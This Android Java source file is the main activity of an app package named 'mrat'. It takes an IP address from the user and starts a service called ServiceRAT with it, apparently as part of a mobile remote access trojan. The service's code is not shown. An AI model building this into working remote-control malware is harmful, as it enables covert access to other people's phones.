package afernandezb92.mrat;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import static android.R.attr.data;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private EditText ipText;
    public String ip;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //Con esta llamada funcionaba cuando estaba todo en MainActivity
        //Client client = new Client(hostname, portnumber, MainActivity.this, findViewById(android.R.id.content));
        ipText = (EditText) findViewById(R.id.ip);
        Button bt = (Button) findViewById(R.id.button);
        bt.setOnClickListener(this);
    }

    public void onClick(View view) {
        ip = ipText.getText().toString();
        Intent intent = new Intent(this, ServiceRAT.class);
        intent.putExtra("IP", ip);
        startService(intent);
    }
}
